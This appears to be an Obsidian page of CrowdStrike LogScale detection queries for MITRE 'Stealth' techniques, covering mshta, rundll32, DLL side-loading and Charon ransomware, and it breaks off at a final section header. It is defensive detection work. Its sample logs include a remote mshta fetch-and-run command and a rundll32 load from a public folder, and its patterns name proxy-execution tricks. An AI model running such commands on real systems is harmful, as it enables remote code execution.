# TA0005 - Stealth

[[00_Master_CQL_Index|← Master CQL Index]]

> Purpose: Atomic CQL/Falcon LogScale detections mapped to MITRE ATT&CK Stealth. Each technique section includes Obsidian metadata callouts with Dataview-style inline fields and a production-ready CQL block grounded in LogScale pipe/filter/aggregation syntax.

---

### [[T1218.005]] - Mshta

> [!metadata]+ Detection Metadata
> tactic:: Stealth
> technique_id:: T1218.005
> technique_name:: Mshta
> logscale_stream:: ProcessRollup2
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: High
> tags:: CQL, MITRE/Stealth

* Detection Objective: Detect mshta abuse for script execution from URLs, inline scriptlets, or suspicious user-writable locations.
* Telemetry Requirements: ProcessRollup2

#### Production-Ready CQL Query:

```cql
// Title: Mshta Remote or Inline Script Execution
// Focus: mshta.exe executing URL, javascript/vbscript, or user path content
#event_simpleName=ProcessRollup2
| ImageFileName=/\\mshta\.exe$/i
| CommandLine=/(http|https|javascript:|vbscript:|\\Users\\|\\ProgramData\\|\\Temp\\|\.hta)/i
| select([@timestamp, ComputerName, aid, UserName, ParentBaseFileName, ImageFileName, CommandLine])
| sort(@timestamp, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: mshta execution with remote content, inline script, or untrusted path.
* Triage Steps: Inspect URL/file content and parent process; search for follow-on PowerShell, rundll32, or persistence actions.
* Potential False Positives: Legacy enterprise HTA applications; document approved HTA paths and signers.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","FileName":"mshta.exe","CommandLine":"mshta.exe http://10.0.0.5/a.hta"}
```

---

### [[T1218.005]] - Mshta — CQL Hub: LOLBin Mshta

> [!metadata]+ Detection Metadata
> tactic:: Stealth
> technique_id:: T1218.005
> technique_name:: Mshta
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: LOLBin_Mshta.yml
> cql_hub_name:: LOLBin Mshta
> cql_hub_author:: ByteRay GmbH
> cql_hub_mitre_ids:: T1218.005, T1105
> related_mitre_ids:: T1218.005, T1105
> required_modules:: Insight
> cql_hub_tags:: Hunting
> tags:: CQL, MITRE/Stealth, CQL_Hub

* Detection Objective: This query detects the use of mshta.exe.

* Telemetry Requirements: Endpoint
* Source: CQL Hub (`LOLBin_Mshta.yml`), author: ByteRay GmbH.
* Original CQL Hub MITRE IDs: T1218.005, T1105.
* Related/Resolved MITRE IDs: T1218.005, T1105.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight. Validate that this telemetry/module exists in the environment before operational use.

```cql
in(#event_simpleName, values=["ProcessRollup2","ProcessBlocked"])
| event_platform=Win and ImageFileName=/mshta.exe/i
| CommandLine=/mshta(?:\.exe)?\"?\s+\"?(?<HtaPath>(?:.*?\.hta|(?=\").*?(?=\")|.*?(?=(?:\s|$))))/i
| HtaPath=/(?<HtaFolder>.*)(\\\\|\/)/i
| HtaPath=/(.*(\\\\|\/))?(?<HtaFile>.*)$/i

```

#### Analytical Breakdown & Field Mappings:
* CQL Hub Explanation: Mshta.exe – A Windows utility for executing HTML Applications (`.hta`) — often abused to run embedded or remote VBScript, JScript, or download-and-execute payloads via alternate data streams or web URLs.  [LOLBAS - Mshta.exe](https://lolbas-project.github.io/lolbas/Binaries/Mshta/)
* Key Indicators: Review query output fields and filters from `LOLBin_Mshta.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1218.011]] - Rundll32

> [!metadata]+ Detection Metadata
> tactic:: Stealth
> technique_id:: T1218.011
> technique_name:: Rundll32
> logscale_stream:: ProcessRollup2
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Medium
> tags:: CQL, MITRE/Stealth

* Detection Objective: Detect rundll32 executing DLLs from suspicious locations or with JavaScript/protocol handler patterns.
* Telemetry Requirements: ProcessRollup2, ImageHash

#### Production-Ready CQL Query:

```cql
// Title: Rundll32 Suspicious DLL or Script Proxy Execution
// Focus: rundll32 loading from user-writable paths or script/protocol abuse
#event_simpleName=ProcessRollup2
| ImageFileName=/\\rundll32\.exe$/i
| CommandLine=/(\\Users\\|\\ProgramData\\|\\Temp\\|\\AppData\\|javascript:|url\.dll|Control_RunDLL|#,|\.dll,)/i
| NOT CommandLine=/\\Windows\\System32\\/i
| select([@timestamp, ComputerName, aid, UserName, ParentBaseFileName, ImageFileName, CommandLine, SHA256HashData])
| sort(@timestamp, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: rundll32 command line references non-system DLL paths or proxy execution tokens.
* Triage Steps: Verify DLL signer/hash and export name; inspect preceding file creation events.
* Potential False Positives: Legitimate control panel applets or vendor utilities using rundll32.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","FileName":"rundll32.exe","CommandLine":"rundll32.exe C:\\Users\\Public\\updater.dll,Start"}
```

---

### [[T1218.011]] - Rundll32 — CQL Hub: LOLBin Rundll32

> [!metadata]+ Detection Metadata
> tactic:: Stealth
> technique_id:: T1218.011
> technique_name:: Rundll32
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: LOLBin_Rundll32.yml
> cql_hub_name:: LOLBin Rundll32
> cql_hub_author:: ByteRay GmbH
> cql_hub_mitre_ids:: T1218.011, T1564.004
> related_mitre_ids:: T1218.011, T1564.004
> required_modules:: Insight
> cql_hub_tags:: Hunting
> tags:: CQL, MITRE/Stealth, CQL_Hub

* Detection Objective: This query detects the use of Rundll32 from parents that are known for misuse.

* Telemetry Requirements: Endpoint
* Source: CQL Hub (`LOLBin_Rundll32.yml`), author: ByteRay GmbH.
* Original CQL Hub MITRE IDs: T1218.011, T1564.004.
* Related/Resolved MITRE IDs: T1218.011, T1564.004.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight. Validate that this telemetry/module exists in the environment before operational use.

```cql
in(#event_simpleName, values=["ProcessRollup2","ProcessBlocked"])
| event_platform=Win and ImageFileName=/rundll32.exe/i
| in(ParentBaseFileName, values=["cmd.exe","winword.exe","powerpnt.exe","excel.exe","outlook.exe","mshta.exe","cscript.exe","wscript.exe"])

```

#### Analytical Breakdown & Field Mappings:
* CQL Hub Explanation: Rundll32.exe – A native Windows binary that can be abused to execute DLLs, scripts, and other payloads, making it a common technique in Living-off-the-Land attacks.  [LOLBAS - Rundll32.exe](https://lolbas-project.github.io/lolbas/Binaries/Rundll32/)
* Key Indicators: Review query output fields and filters from `LOLBin_Rundll32.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1574.001]] - DLL (Side-Loading Procedure)

> [!metadata]+ Detection Metadata
> tactic:: Stealth
> technique_id:: T1574.001
> technique_name:: DLL
> logscale_stream:: ProcessRollup2
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Medium
> tags:: CQL, MITRE/Stealth

* Detection Objective: Detect signed or trusted-looking applications launched from user-writable directories with nearby DLL references, a common side-loading pattern.
* Telemetry Requirements: ProcessRollup2, ImageLoad, FileWritten

#### Production-Ready CQL Query:

```cql
// Title: Potential DLL Side-Loading from User-Writable Path
// Focus: Trusted executable name launched outside standard install path
#event_simpleName=ProcessRollup2
| ImageFileName=/(\\Users\\|\\ProgramData\\|\\Temp\\|\\AppData\\)/i
| FileName=/(rundll32|regsvr32|msiexec|OneDrive|Teams|Update|Adobe|Chrome|RuntimeBroker|spoolsv)\.exe$/i
| select([@timestamp, ComputerName, aid, UserName, ParentBaseFileName, ImageFileName, FileName, CommandLine, SHA256HashData])
| sort(@timestamp, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Known/signed-looking executable names executing from untrusted writable locations.
* Triage Steps: Inspect adjacent DLLs in the same directory, signer mismatch, and file creation lineage.
* Potential False Positives: Portable apps and user-installed software.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","FileName":"OneDrive.exe","ImageFileName":"\\Device\\HarddiskVolume3\\Users\\Public\\OneDrive.exe"}
```

---

### [[T1574.001]] - DLL (Search Order Hijacking Procedure)

> [!metadata]+ Detection Metadata
> tactic:: Stealth
> technique_id:: T1574.001
> technique_name:: DLL
> logscale_stream:: ProcessRollup2
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Medium
> tags:: CQL, MITRE/Stealth

* Detection Objective: Detect executable launched from a directory where attacker-controlled DLL placement is likely, such as Downloads, Temp, or ProgramData.
* Telemetry Requirements: ProcessRollup2, FileWritten, ImageLoad

#### Production-Ready CQL Query:

```cql
// Title: Potential DLL Search Order Hijack Launch
// Focus: portable/trusted executable run from writable directory
#event_simpleName=ProcessRollup2
| ImageFileName=/(\\Users\\[^\\]+\\Downloads\\|\\Users\\Public\\|\\ProgramData\\|\\Temp\\)/i
| FileName=/(setup|update|install|chrome|msedge|teams|onedrive|adobe|java|python|node)\.exe$/i
| select([@timestamp, ComputerName, aid, UserName, ParentBaseFileName, ImageFileName, FileName, CommandLine, SHA256HashData])
| sort(@timestamp, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Trusted-looking executable launched from writable path where DLL planting is plausible.
* Triage Steps: List same-directory DLLs and compare signer/hash baselines.
* Potential False Positives: Portable installers and user-installed software.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","FileName":"setup.exe","ImageFileName":"\\Device\\HarddiskVolume3\\Users\\Public\\setup.exe"}
```

---

### [[T1574.001]] - DLL — CQL Hub: Charon Ransomware Detection and Correlation

> [!metadata]+ Detection Metadata
> tactic:: Stealth
> technique_id:: T1574.001
> technique_name:: DLL
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: Charon_Ransomware_Detection_and_Correlation.yml
> cql_hub_name:: Charon Ransomware Detection and Correlation
> cql_hub_author:: Aamir Muhammad
> related_mitre_ids:: T1574.001
> required_modules:: Insight
> cql_hub_tags:: Hunting
> tags:: CQL, MITRE/Stealth, CQL_Hub

* Detection Objective: The query chain detects and correlates multiple indicators of the Charon ransomware attack lifecycle, including ransomware package writes, malicious DLL sideloading, process execution triggers (notably via svchost.exe), creation of ransom notes, and suspicious service creation (WWC.sys). It merges these findings across several event types to confirm successful ransomware deployment.
* Telemetry Requirements: Endpoint
* Source: CQL Hub (`Charon_Ransomware_Detection_and_Correlation.yml`), author: Aamir Muhammad.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight. Validate that this telemetry/module exists in the environment before operational use.

```cql
defineTable(query={#event_simpleName=/Written|PeFileWritten/iF
|case{
  in(field="SHA256HashData", values=["f3c8b4986377b5a32c20fc665b0cbe0c44153369dadbcaa5e3d0e3c8545e4ba5","e0a23c0d99c45d40f6ef99c901bacf04bb12e9a3a15823b663b392abadd2444e","
5d0675f20eeb8f824097791711135a273680f77bf5e9f0e168074e97464f21b5","739e2cac9e2a15631c770236b34ba569aad1d1de87c6243f285bf1995af2cdc2"]) |rename(field="SHA256HashData", as="RansomeSHA256")|rename(field="FileName", as="RansomewareFileWritten")|Analysis:="Ransomware Package written to disk"; //5d0675f20eeb8f824097791711135a273680f77bf5e9f0e168074e97464f21b5 is not malicious
  FileName = /msedge.dll|TSMSISrv.dll|PulseBeaconX96311.dll|DumpStack.log/iF |rename(field="FileName", as="RansomewareFileWritten")|rename(field="SHA256HashData", as="RansomeSHA256") |Analysis:="Ransomware Package written to disk"; //Edge.exe is not malicious
  OriginalFileName=PulseBeaconX96311.dll |rename(field="FileName", as="RansomewareFileWritten") |rename(field="SHA256HashData", as="RansomeSHA256")|Analysis:="Ransomware Package written to disk"
}
|rename(field="@timestamp", as="RansomeFileWrittenTime")| RansomeFileWrittenTime := formatTime("%e %b %Y %r", field=RansomeFileWrittenTime, locale=en_UAE, timezone="Asia/Dubai")
|groupBy([FilePath,ComputerName,#event_simpleName],function=([collect([RansomeFileWrittenTime,RansomeSHA256,RansomewareFileWritten,Analysis],limit=200000),count(RansomewareFileWritten,distinct=true,as=FileCount)]))
|FileCount>1
}, include=[FilePath,FileCount,ComputerName,#event_simpleName,RansomeFileWrittenTime,RansomeSHA256,RansomewareFileWritten,Analysis], name="RansomeFileWritten")
|defineTable(query={
  #event_simpleName=/ClassifiedModuleLoad/iF
  |(TargetImageFileName = /\\Edge.exe/iF or OriginalFilename = /cookie_exporter.exe/iF) and (FileName = /msedge.dll|TSMSISrv.dll|PulseBeaconX96311.dll/iF)
    |rename(field="TargetProcessId", as="PID")
    |rename(field="TargetImageFileName", as="DllSideLoadProcess")
    |rename(field="OriginalFilename", as="DllSideLoadOriginalName")
    |rename(field="FileName", as="DllLoaded")
    |rename(field="FilePath", as="DllLoadedPath")
    |rename(field="@timestamp", as="SideloadTime")| SideloadTime := formatTime("%e %b %Y %r", field=SideloadTime, locale=en_UAE, timezone="Asia/Dubai")
    |rename(field="CommandLine", as="DllLoadedCommandLine")
    | Analysis:="Malicious DLL has been sideloaded"
}, include=[SideloadTime,PID,DllSideLoadProcess,DllLoadedCommandLine,DllSideLoadOriginalName,DllLoaded,DllLoadedPath,Analysis], name="DLLSideLoad")
|defineTable(query={#event_simpleName=/ProcessRollup2/iF
  |match(file="DLLSideLoad", field=[aid,ParentProcessId],column=[aid,PID],strict=true,include=[SideloadTime,PID,DllSideLoadProcess,DllSideLoadOriginalName,DllLoaded,DllLoadedPath])
  |rename(field="FileName", as="ChildProcess")
  |rename(field="CommandLine", as="ChildProcessCommandLine")
  |lower("ChildProcess")
  |Analysis:= if(ChidProcess==svchost.exe, then="Charon Ransomware Deployement Triggered", else="Charon Ransomware Deployement might NOT be Triggered as No SVCHOST.EXE process triggered")
}, include=[ChildProcess,ChildProcessCommandLine,SideloadTime,PID,DllSideLoadProcess,DllLoadedCommandLine,DllSideLoadOriginalName,DllLoaded,DllLoadedPath,Analysis], name="RansomwareDeploy")
|defineTable(query={#event_simpleName=/Written/iF
  |match(file="RansomwareDeploy", field=[TargetProcessId],column=[ContextProcessId],strict=true,include=[ChildProcess,ChildProcessCommandLine,SideloadTime,PID,DllSideLoadProcess,DllLoadedCommandLine,DllSideLoadOriginalName,DllLoaded,DllLoadedPath,Analysis])
  |case{
   FileName=/.charon$/iF                    |rename(field="FileName", as="RansomedFiles") |Analysis:="Charon Ransomware has been successfully deployed";
   FileName="How to Restore Your Files.txt" |rename(field="FileName", as="RansomwareNote")  |Analysis:="Charon Ransomware has been successfully deployed"
       }
  }, include=[RansomedFiles,RansomwareNote,Analysis,ChildProcess,ChildProcessCommandLine,SideloadTime,PID,DllSideLoadProcess,DllLoadedCommandLine,DllSideLoadOriginalName,DllLoaded,DllLoadedPath,Analysis], name="RansomeNote")
|defineTable(query={#event_simpleName=CreateService and (ServiceDisplayName=/WWC/iF or ServiceImagePath=/\\System32\\Drivers\\WWC.sys/iF)}, include=[*], name="ServiceCharon")
|readFile(["RansomeFileWritten","DLLSideLoad","RansomwareDeploy","RansomeNote","ServiceCharon"])

```

#### Analytical Breakdown & Field Mappings:
* CQL Hub Explanation: [Charon Ransomware](https://www.trendmicro.com/en_dk/research/25/h/new-ransomware-charon.html)  Reference: [GitHub Aamir-Muhammad/CrowdStrike-Queries](https://github.com/Aamir-Muhammad/CrowdStrike-Queries/blob/main/Hunting-Queries/Charon-Ransomware.md)
* Key Indicators: Review query output fields and filters from `Charon_Ransomware_Detection_and_Correlation.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1574.001]] - DLL — CQL Hub: Dll-Side Loading Detection Query

> [!metadata]+ Detection Metadata
> tactic:: Stealth
> technique_id:: T1574.001
> technique_name:: DLL
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: Dll-Side_Loading_Detection_Query.yml
> cql_hub_name:: Dll-Side Loading Detection Query
> cql_hub_author:: Aamir Muhammad
> cql_hub_mitre_ids:: T1574.001
> related_mitre_ids:: T1574.001
> required_modules:: Insight
> cql_hub_tags:: Hunting
> tags:: CQL, MITRE/Stealth, CQL_Hub

* Detection Objective: The query traces processes that write both DLL and EXE files to the same location while exhibiting masquerading behavior.
* Telemetry Requirements: Endpoint
* Source: CQL Hub (`Dll-Side_Loading_Detection_Query.yml`), author: Aamir Muhammad.
* Original CQL Hub MITRE IDs: T1574.001.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight. Validate that this telemetry/module exists in the environment before operational use.

```cql
//Tracing the ProcessId of a Process / File which is writting atleast 1 each EXE and DLL to same Path, Doing the Process Original name masquarading and atleast 1 File Author name is Microsoft in "DLL-Filewrite", tracking throughtout as SusProcessID
defineTable(query={#event_simpleName=/(PeFileWritten)/iF 
|lowercase("FileName")
|lowercase("OriginalFilename")
|(FileName="*" and OriginalFilename="*")
| regex("(?<DllFileName>^.*)\.dll", field=FileName, strict=false)
| regex("(?<EXEFileName>^.*)\.exe", field=FileName, strict=false)
| MasquraeCheck:=if(FileName==OriginalFilename, then="Normal", else="Masquarade") |MasquraeCheck!="Normal"
|SusProcessID:=format(format="%s%s", field=[aid,ContextProcessId])
|rename(field="SHA256HashData", as="SusHash")
|rename(field="FileName", as="FileWritten")
// Exclusions FOr Edge Browser
|OriginalFilename!=microsoftedgeupdate.exe OriginalFilename!=msedgeupdate.dll
|groupBy([SusProcessID,FilePath],function=([collect([DllFileName,EXEFileName,SusHash,FileWritten,OriginalFilename,CompanyName]),count(DllFileName,as=DllC),count(EXEFileName,as=EXEC)]),limit=max)
|DllC>=1 EXEC>=1 CompanyName=/Microsoft/iF 
}, include=[FilePath,FileWritten,OriginalFilename,SusHash,DllFileName,EXEFileName,CompanyName,SusProcessID,ComputerName,UserName], name="DLL-Filewrite")

// Then tracing the Parent File for files written operation in "DLL-Filewrite" getting FileWriteParent, tracked as "DLL-Parent"
|defineTable(query={#event_simpleName=/(ProcessRollup2)/iF  
|TargetProcessId:=format(format="%s%s", field=[aid,TargetProcessId])
|ParentProcessId:=format(format="%s%s", field=[aid,ParentProcessId])
|match(file="DLL-Filewrite", field=[TargetProcessId],column=[SusProcessID],strict=true,include=[FilePath,FileWritten,OriginalFilename,SusHash,CompanyName,SusProcessID,ComputerName,UserName])
|rename(field="ParentBaseFileName", as="FileWriteParent")
|case{
CommandLine=* |regex("\"[^\"]+\"\\s+\"(?P<FullPath>[^\"]*\\\\)?", field=CommandLine)| regex(".*\\\\(?<FileNamey>[^\\\\\"]+?)\"?$", field=CommandLine);
*
}
|case{
  FullPath="*" or FileNamey="*" | FileWriteFileSource:=format(format="%s\n\t└-> %s", field=[FileNamey,FullPath]);
  FullPath!="*" FileNamey!="*" | FileWriteFileSource:=format(format="%s", field=[FileName]);
  *
}
| coalesce([FileNamey,FileName],as=FileWriteFile,ignoreEmpty=false)
}, include=[FileWriteFile,FileWriteFileSource,FileWriteParent,FilePath,FileWritten,SusHash,OriginalFilename,CompanyName,SusProcessID,ComputerName,UserName], name="DLL-Parent")

// Then Tracing the DLL-side-Loading Process startup for "DLL-Parent", getting DLLSideLoadProcess, tracked as "DLLSideLoadProcess"
|defineTable(query={#event_simpleName=/(ProcessRollup2)/iF |DLLSideLoadProcess:=format(format="%s\n\t└-> %s", field=[ParentBaseFileName,FileName])
|TargetProcessId:=format(format="%s%s", field=[aid,TargetProcessId])
|ParentProcessId:=format(format="%s%s", field=[aid,ParentProcessId])
|match(file="DLL-Parent", field=[ParentProcessId],column=[SusProcessID],strict=true,include=[FileWriteFile,FileWriteFileSource,FileWriteParent,FilePath,FileWritten,SusHash,OriginalFilename,CompanyName,SusProcessID,ComputerName,UserName])
|rename(field="TargetProcessId", as="ModuleLoadId")
| rename(field="ProcessStartTime", as="ProcessStartTime")
}, include=[FileWriteFile,FileWriteFileSource,ProcessStartTime,DLLSideLoadProcess,FileWriteParent,FilePath,FileWritten,SusHash,OriginalFilename,CompanyName,ModuleLoadId,SusProcessID,ComputerName,UserName], name="DLLSideLoadProcess")

// Then tracing the DLL/EXE side loaded for DLLSideLoadProcess from "DLLSideLoadProcess", tracked as "DllLoading"
|defineTable(query={#event_simpleName=/(ClassifiedModuleLoad)/iF |rename(field="FileName", as="DllLoad") 
|TargetProcessId:=format(format="%s%s", field=[aid,TargetProcessId])
|ParentProcessId:=format(format="%s%s", field=[aid,ParentProcessId])
|ContextProcessId:=format(format="%s%s", field=[aid,ContextProcessId])
| "DllLoaded Files":= format(format="%s\n\t└-> %s", field=[DllLoad,FilePath])
|match(file="DLLSideLoadProcess", field=[ContextProcessId],column=[ModuleLoadId],strict=true,include=[FileWriteFile,FileWriteFileSource,ProcessStartTime,DLLSideLoadProcess,FileWriteParent,FilePath,FileWritten,SusHash,OriginalFilename,CompanyName,SusProcessID,ComputerName,UserName])
|rename(field="TargetProcessId", as="ModuleLoadId")

|case {
  ModuleLoadTelemetryClassification = 1
| ModuleLoadTelemetryClassification := "FIRST_LOAD\n\t\t└->This is the first time this module has been loaded into a process on the host";
  ModuleLoadTelemetryClassification = 2
| ModuleLoadTelemetryClassification := "RUNDLL32_TARGET\n\t\t└->This module is the target of a rundll32.exe invocation";
  ModuleLoadTelemetryClassification = 4
| ModuleLoadTelemetryClassification := "DETECT_TREE\n\t\t└->The module was loaded into a process that is in an active detect tree";
  ModuleLoadTelemetryClassification = 8
| ModuleLoadTelemetryClassification := "MAPPED_FROM_KERNEL_MODE\n\t\t└->The module was loaded into kernel mode address space";
  ModuleLoadTelemetryClassification = 16
| ModuleLoadTelemetryClassification := "UNUSUAL_EXTENSION\n\t\t└->The module has an unexpected, unusual or rare extension";
  ModuleLoadTelemetryClassification = 32
| ModuleLoadTelemetryClassification := "MOTW\n\t\t└->The module has the Mark of the Web zone identifier";
  ModuleLoadTelemetryClassification = 64
| ModuleLoadTelemetryClassification := "SIGN_INFO_CONTINUITY\n\t\t└->The module does not have a valid signature and it was loaded into a process with a primary module that does have a valid signature";
  ModuleLoadTelemetryClassification = 256
| ModuleLoadTelemetryClassification := "ORIGINAL_FILENAME_MISMATCH\n\t\t└->Module's ImageFileName doesn't match OriginalFileName";
  ModuleLoadTelemetryClassification = 512
| ModuleLoadTelemetryClassification := "REMOVABLE_MEDIA\n\t\t└->The module was loaded from removable media (ISO/IMG)";
  ModuleLoadTelemetryClassification = 1024
| ModuleLoadTelemetryClassification := "DATA_EXTENSION\n\t\t└->The module has a data type extension";
  ModuleLoadTelemetryClassification = 257
| ModuleLoadTelemetryClassification := "FIRST_LOAD_AND_FILENAME_MISMATCH\n\t\t└->This is the first time this module has been loaded into a process on the host and its ImageFileName doesnt match OriginalFileName";
  *
| ModuleLoadTelemetryClassification := format(format="Value=%s\n\t\t└->Multiple module load telemetry flags are set, Check ModuleLoadTelemetryClassification documentation", field=[ModuleLoadTelemetryClassification])
}

}, include=[FileWriteFile,FileWriteFileSource,ProcessStartTime,DLLSideLoadProcess,"DllLoaded Files",ModuleLoadTelemetryClassification,FileWriteParent,FilePath,FileWritten,SusHash,OriginalFilename,CompanyName,SusProcessID,ComputerName,UserName], name="DllLoading")

//Performing the aggregation in the presentable format + to prepare for matchup for MOTW URLS in next table
|defineTable(query={readFile([DllLoading])
|groupBy([ProcessStartTime,SusProcessID,ComputerName,UserName],function=([collect([FileWriteFile,FileWriteFileSource,FileWriteParent,FilePath,FileWritten,OriginalFilename,CompanyName,DLLSideLoadProcess,"DllLoaded Files",ModuleLoadTelemetryClassification,SusHash]),count("DllLoaded Files",distinct=true,as="DllLoaded Files Count")]),limit=max)},include=[ProcessStartTime,SusProcessID,ComputerName,FileWriteFile,UserName,FileWriteFileSource,FileWriteParent,FilePath,FileWritten,OriginalFilename,CompanyName,DLLSideLoadProcess,"DllLoaded Files",ModuleLoadTelemetryClassification,SusHash,"DllLoaded Files Count"], name="Aggregation")

//Fetching MOTW URLS
|defineTable(query={#event_simpleName=MotwWritten 
|match(file="Aggregation", field=[ComputerName,FileName],column=[ComputerName,FileWriteFile],strict=true,ignoreCase=true, include=[FileWriteFile,FileWriteFileSource,ProcessStartTime,DLLSideLoadProcess,"DllLoaded Files",ModuleLoadTelemetryClassification,FileWriteParent,FilePath,FileWritten,SusHash,OriginalFilename,CompanyName,SusProcessID,ComputerName,UserName,"DllLoaded Files Count"])
|case{
  HostUrl!="" ReferrerUrl="" |FileWriteFileSourceURL:=format(format="Download URL= %s", field=[HostUrl]);
  HostUrl="" ReferrerUrl!="" |FileWriteFileSourceURL:=format(format="Referrer URL= %s", field=[ReferrerUrl]);
  HostUrl!="" OR ReferrerUrl!="" |FileWriteFileSourceURL:=format(format="Download URL= %s\nReferrer URL= %s", field=[HostUrl,ReferrerUrl]);
  *
}
}, include=[FileWriteFile,FileWriteFileSourceURL,FileWriteFileSource,ProcessStartTime,DLLSideLoadProcess,"DllLoaded Files",ModuleLoadTelemetryClassification,FileWriteParent,FilePath,FileWritten,SusHash,OriginalFilename,CompanyName,SusProcessID,ComputerName,UserName,"DllLoaded Files Count"], name="MOTW")
|readFile(["Aggregation","MOTW"])
|case{
  FileWriteFileSourceURL!="*" |FileWriteFileSourceURL:=format(format="No URL Found", field=[]);
  * 
}
|groupBy([ProcessStartTime,SusProcessID,ComputerName,UserName],function=([collect([FileWriteFileSourceURL,FileWriteFileSource,FileWriteParent,FilePath,FileWritten,OriginalFilename,CompanyName,DLLSideLoadProcess,"DllLoaded Files",ModuleLoadTelemetryClassification,SusHash,"DllLoaded Files Count"])]))
| ProcessStartTime:=ProcessStartTime*1000 |ProcessStartTime := formatTime("%e %b %Y %r", field=ProcessStartTime, locale=en_UAE, timezone="Asia/Dubai")
| rename([[FilePath,FileWrittenPath],[CompanyName,"ExeAuthorCompanyName"],[ModuleLoadTelemetryClassification,"DllLoaded Files Signature"]])
|drop([SusProcessID])

```

#### Analytical Breakdown & Field Mappings:
* CQL Hub Explanation: Reference: [GitHub Aamir-Muhammad/CrowdStrike-Queries](https://github.com/Aamir-Muhammad/CrowdStrike-Queries/blob/main/Hunting-Queries/DLL-Side-Loading-Detection.md)
* Key Indicators: Review query output fields and filters from `Dll-Side_Loading_Detection_Query.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1574.001]] - DLL — CQL Hub: Chromium-Based Browser Hunting via DLL Load

> [!metadata]+ Detection Metadata
> tactic:: Stealth
> technique_id:: T1574.001
> technique_name:: DLL
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: chromium_based_browser_hunting_via_dll_load.yml
> cql_hub_name:: Chromium-Based Browser Hunting via DLL Load
> cql_hub_author:: ByteRay GmbH
> related_mitre_ids:: T1574.001
> required_modules:: Insight
> cql_hub_tags:: Hunting
> tags:: CQL, MITRE/Stealth, CQL_Hub

* Detection Objective: This query identifies Chromium-based browsers by detecting the loading of chrome.dll into running processes. Unlike simple process name checks, this method helps uncover browsers that may not be named chrome.exe but still rely on Chromium components. The query excludes known chrome.exe processes to highlight less obvious Chromium-based browsers, although it’s important to note that not all Chromium-based browsers necessarily load chrome.dll.

* Telemetry Requirements: Endpoint
* Source: CQL Hub (`chromium_based_browser_hunting_via_dll_load.yml`), author: ByteRay GmbH.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight. Validate that this telemetry/module exists in the environment before operational use.

```cql
defineTable(query={#event_simpleName=ClassifiedModuleLoad
| ImageFileName=/chrome\.dll/i
| TargetImageFileName!=/chrome\.exe/i}, include=[ComputerName, TargetProcessId], name="DllLoads")
| #event_simpleName=ProcessRollup2 TargetProcessId=*
| match(table="DllLoads", field=[TargetProcessId])
| table([@timestamp, aid, ComputerName, FileName, TargetProcessId, ImageFileName, TargetImageFileName])
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Review query output fields and filters from `chromium_based_browser_hunting_via_dll_load.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1574.001]] - DLL — CQL Hub: Notepad++ supply chain attack

> [!metadata]+ Detection Metadata
> tactic:: Stealth
> technique_id:: T1574.001
> technique_name:: DLL
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: notepad_plus_plus_supply_chain_attack.yml
> cql_hub_name:: Notepad++ supply chain attack
> cql_hub_author:: Aamir Muhammad
> related_mitre_ids:: T1574.001
> required_modules:: Insight
> cql_hub_tags:: Hunting
